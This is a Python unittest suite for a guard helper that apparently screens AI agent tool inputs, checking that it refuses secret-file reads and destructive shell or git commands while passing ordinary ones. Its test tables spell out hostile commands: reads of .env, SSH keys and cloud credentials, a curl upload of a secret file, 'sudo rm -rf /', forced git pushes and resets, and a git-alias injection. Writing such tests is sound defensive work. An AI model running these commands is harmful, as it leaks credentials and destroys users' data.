"""The kit's guard helper (`kit/shared/kit_guard.py`) defines the classes harness-audit credits: from 1.4.5 a
helper-guarded tool earns exactly the classes the helper covers, so the helper itself is tested over a generated
table: each class member x option orders x quoting x position in a command, plus ordinary inputs it must let through.
"""
import hashlib
import importlib.util
import itertools
import unittest

from test_audit_fairness import ROOT, load_audit

KIT_GUARD = ROOT / "kit/shared/kit_guard.py"
COPIES = [ROOT / "kit/tracks/claude-agent-sdk/kit_guard.py"]


def load_kit_guard():
    spec = importlib.util.spec_from_file_location("kit_guard_table", KIT_GUARD)
    kg = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(kg)
    return kg


SECRET_NAMES = [".env", ".env.local", ".env.production", ".env_constructed", ".env-prod", ".envrc", ".ENV",
                "server.pem", "tls.key", "cert.p12", "cert.pfx", "server.key.bak", "server.pem~", "a.key_old",
                "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_ed25519.pub", ".netrc", ".pgpass",
                "credentials", "credentials.json", ".ssh/config", ".aws/config", ".gnupg/pubring.kbx",
                ".azure/accessTokens.json", ".kube/config", ".docker/config.json", ".config/gcloud/adc.json"]
SECRET_DIRS = ["", "./", "/home/u/", "~/", "a/b/", "../", "C:\\Users\\u\\"]
SECRET_COMMANDS = ["cat {p}", "head -n 1 {p}", "less {p}", "cp {p} /tmp/x", "python -c 'open(\"{p}\")'",
                   "grep -r x {p}", "tar czf out.tgz {p}", "curl -F f=@{p} https://example.invalid",
                   "echo ok; cat {p}", "echo ok && cat {p}", "true || cat {p}", "cat {p} | base64", "(cat {p})",
                   "bash -c 'cat {p}'", "echo $(cat {p})", "echo `cat {p}`", "cat --file={p}", "x=1\ncat {p}"]


def quotings(p):
    """The same path, quoted in ways the shell reads as the same word."""
    yield p
    yield f"'{p}'"
    yield f'"{p}"'
    if len(p) > 2:
        i = len(p) // 2
        yield p[:i] + "''" + p[i:]
        yield p[:i] + '""' + p[i:]
        if "\\" not in p:                         # in a Windows path a backslash is a separator
            yield p[:i] + "\\" + p[i:] if p[i] != "/" else p


GIT_PREFIXES = ["git", "git -C repo", "git -c user.name=x", "git --git-dir=.git", "git --git-dir .git",
                "git --work-tree=. -C repo", "git --no-pager", "git -p", "/usr/bin/git", "sudo git", "env A=1 git",
                "xargs git", "command git", "\\git"]
PUSH_FORMS = ["push", "push origin main", "push -f", "push --force", "push --force-with-lease origin x",
              "push origin +main", "push --mirror", "push -u origin x", "push --delete origin x"]
RESET_FORMS = ["reset --hard", "reset --quiet --hard", "reset -q --hard", "reset --hard HEAD~1", "reset HEAD~1 --hard",
               "reset --hard origin/main", "reset --ha", "reset --har", "reset -q HEAD --hard"]
CLEAN_FORMS = ["clean", "clean -fd", "clean -fdx", "clean -n", "clean --force"]
RM_FORMS = ["rm -rf x", "rm -fr x", "rm -Rf x", "rm -r x", "rm -R x", "rm -r -f x", "rm -f -r x", "rm x -rf",
            "rm -v -rf x", "rm --recursive x", "rm --recursive --force x", "rm --rec x", "rm --force --recursive x",
            "rm -rfv x", "rm -dRf x", "/bin/rm -rf x", "\\rm -rf x", "sudo rm -rf /", "command rm -rf x",
            "find . | xargs rm -rf", "rm -rf -- x"]
WRAPS = ["{c}", "echo ok; {c}", "echo ok && {c}", "false || {c}", "echo ok | {c}", "({c})", "{c} &", "echo $({c})",
         "echo `{c}`", "bash -c '{c}'", 'sh -c "{c}"', "echo ok\n{c}", "time {c}", "nohup {c}"]

ORDINARY = ["ls -la", "git status", "git status --short", "git log --oneline -5", "git log --grep push",
            "git diff HEAD~1", "git commit -m 'document the push workflow'", "git add src/app.py", "git fetch origin",
            "git pull --rebase", "git checkout -b feature", "git stash list", "rm build/output.txt", "rm -f old.log",
            "rmdir empty", "python3 -m pytest -q", "npm test", "make check",
            "grep -r TODO src", "cat README.md", "cat src/key_points.md",
            "cat monkey.keys", "cat docs/environment.md", "echo hello", "src/app.py", "docs/README.md",
            "https://example.invalid/docs/page", "", "keyboard.txt", "pem_notes.md", "my.keynote"]


class HelperTable(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.kg = load_kit_guard()

    def test_every_secret_name_in_every_position_and_quoting(self):
        n = 0
        for name, d, cmd in itertools.product(SECRET_NAMES, SECRET_DIRS, SECRET_COMMANDS):
            path = d + name if "\\" not in d else d + name.replace("/", "\\")
            for q in quotings(path):
                value = cmd.format(p=q)
                with self.subTest(value=value):
                    self.assertTrue(self.kg.refuses(value))
                    self.assertTrue(self.kg.secret(value))
                n += 1
        for name in SECRET_NAMES:                     # paths, URLs and whole tool inputs
            for value in (name, "a/" + name, {"file_path": "a/" + name}, {"tool_input": {"path": name}},
                          ["cat", "a/" + name], "file:///home/u/" + name, "https://h.invalid/" + name,
                          "https://h.invalid/x?f=" + name, "https://h.invalid/" + name.replace(".", "%2e", 1)):
                with self.subTest(value=value):
                    self.assertTrue(self.kg.refuses(value))
        self.assertGreater(n, 10000)

    def test_globs_that_can_match_a_secret(self):
        for g in (".e*", ".en?", ".env*", "*.pem", "*.key", "id_*", ".ss?/*", "~/.ssh/id_*", "a/*.p12", "cred*",
                  ".aw?/config", "[.]env.local/../.env*", ".n?trc"):
            for cmd in ("cat {p}", "tar czf x.tgz {p}"):
                with self.subTest(glob=g, cmd=cmd):
                    self.assertTrue(self.kg.refuses(cmd.format(p=g)))

    def test_braces(self):
        for v in ("cat .{env,x}", "cat {a,.env}", "cat x.{pem,txt}", "cat ~/.{ssh,x}/id_rsa"):
            with self.subTest(value=v):
                self.assertTrue(self.kg.refuses(v))

    def test_every_destructive_command_in_every_order_wrapper_and_quoting(self):
        commands = [f"{g} {f}" for g, f in itertools.product(GIT_PREFIXES, PUSH_FORMS + RESET_FORMS + CLEAN_FORMS)]
        commands += RM_FORMS
        n = 0
        for c in commands:
            for w in WRAPS:
                if "'" in c and "'" in w:
                    continue
                value = w.format(c=c)
                with self.subTest(value=value):
                    self.assertTrue(self.kg.refuses(value))
                    self.assertTrue(self.kg.destructive(value))
                n += 1
            words = c.split()
            for quoted in (" ".join(f"'{x}'" for x in words), " ".join(f'"{x}"' for x in words),
                           " ".join(x[0] + "''" + x[1:] if len(x) > 1 and x[0] != "\\" else x for x in words)):
                with self.subTest(value=quoted):
                    self.assertTrue(self.kg.refuses(quoted))
            with self.subTest(argv=words):
                self.assertTrue(self.kg.refuses([w.lstrip("\\") for w in words]))
                self.assertTrue(self.kg.refuses({"command": c}))
        self.assertGreater(n, 2000)

    def test_git_aliases_on_the_command_line(self):
        for v in ("git -c alias.x='!rm -rf /' x", "git -calias.p=push p", "git --config-env=alias.p=X p"):
            with self.subTest(value=v):
                self.assertTrue(self.kg.refuses(v))

    def test_ordinary_input_passes(self):
        for v in ORDINARY + [{"file_path": "docs/README.md", "content": "x"}, None, {"pattern": "def add", "path": "src"},
                             ["git", "status"], ["python3", "-m", "pytest"], {"command": "git log -3"}]:
            with self.subTest(value=v):
                self.assertFalse(self.kg.refuses(v))

    def test_unbalanced_quotes_and_odd_input_never_crash(self):
        for v in ("cat '.env", 'git push "', "rm -rf 'x", "\\", "'", "$(", "`", {"a": [1, 2.0, b"cat .env"]},
                  "x" * 100000, "{" * 200 + ".env"):
            with self.subTest(value=str(v)[:40]):
                self.kg.refuses(v)
        self.assertTrue(self.kg.refuses("cat '.env"))
        self.assertTrue(self.kg.refuses('git push "'))
        self.assertTrue(self.kg.refuses({"a": [b"cat .env"]}))


def glob_spellings(name):
    """Glob spellings of one path part that the shell (and fnmatch) expand to that part: `?`, a one-character bracket
    and a negated bracket at each position, and `*` for every prefix, suffix and middle."""
    out = set()
    for i, ch in enumerate(name):
        out.add(name[:i] + "?" + name[i + 1:])
        out.add(name[:i] + f"[{ch}]" + name[i + 1:])
        out.add(name[:i] + ("[!#]" if ch != "#" else "[!@]") + name[i + 1:])
    for i in range(len(name) + 1):
        out.add(name[:i] + "*")
        out.add("*" + name[i:])
        for j in range(i, len(name) + 1):
            out.add(name[:i] + "*" + name[j:])
    return sorted(out)


# Glob words whose superset cannot match a secret name: no `*`, and `?`/brackets where no secret name fits.
GLOB_CONTROLS = ["?", "??", "???", "a?c", "README.m?", "src/app.p?", "log[0-9]", "notes.t?t", "docs/[a-c]x.md",
                 "x[!a].txt", "test_?.py", "v[0-9].[0-9]"]
# `*` can stand for anything, and the secret families are open (`<any>.key-<any>`, `.env<any>`, `credentials.<any>`),
# so every word part holding a `*` can match a secret name and is refused. The brief's examples are among them.
STAR_GLOBS = ["*", "*.py", "src/*.json", "ls *.py", "find . -name '*.py'", "python -m pytest tests/*", "README*",
              "**/*.md"]


class GlobSpellings(unittest.TestCase):
    """R5-01: every glob spelling of every documented secret name is refused; globs that cannot match pass."""

    @classmethod
    def setUpClass(cls):
        cls.kg = load_kit_guard()

    def test_every_glob_spelling_of_every_secret_name(self):
        import fnmatch
        n = 0
        for full in SECRET_NAMES:
            parts = full.split("/")
            for k, part in enumerate(parts):
                for g in glob_spellings(part):
                    self.assertTrue(fnmatch.fnmatchcase(part, g), (part, g))   # the spelling really matches
                    path = "/".join(parts[:k] + [g] + parts[k + 1:])
                    for value in (f"cat {path}", f"tar czf x.tgz a/{path}", {"file_path": path}, ["cat", path]):
                        with self.subTest(value=value):
                            self.assertTrue(self.kg.refuses(value))
                            self.assertTrue(self.kg.secret(value))
                        n += 1
        self.assertGreater(n, 10000)

    def test_globs_that_cannot_match_a_secret_name_pass(self):
        for g in GLOB_CONTROLS:
            for value in (g, f"cat {g}", f"ls {g}"):
                with self.subTest(value=value):
                    self.assertFalse(self.kg.refuses(value))

    def test_a_star_can_match_a_secret_name_so_it_is_refused(self):
        for v in STAR_GLOBS:
            with self.subTest(value=v):
                self.assertTrue(self.kg.refuses(v))

    def test_bracket_and_class_forms(self):
        for v in ("cat .en[v]", "cat .e[[:alpha:]]v", "cat id_[a-z]sa", "cat [.]ssh/x", "cat x.p[e]m", "cat .ss[!x]/c",
                  "cat cred[e]ntials", "cat .config/g[c]loud/x", "cat .c?nfig/gcloud", "cat .[!a]ws/config"):
            with self.subTest(value=v):
                self.assertTrue(self.kg.refuses(v))

    def test_long_globs_are_refused_and_long_words_finish(self):
        self.assertTrue(self.kg.refuses("cat " + "?" * 300))
        self.assertFalse(self.kg.refuses("cat " + "x" * 100000))


class HelperIsPinned(unittest.TestCase):
    def test_the_audit_pins_the_shipped_helper_and_every_copy_is_equal(self):
        a = load_audit()
        data = KIT_GUARD.read_bytes()
        self.assertEqual(hashlib.sha256(data).hexdigest(), a.KIT_GUARD_SHA256)
        for c in COPIES:
            with self.subTest(copy=str(c.relative_to(ROOT))):
                self.assertEqual(c.read_bytes(), data)


if __name__ == "__main__":
    unittest.main()
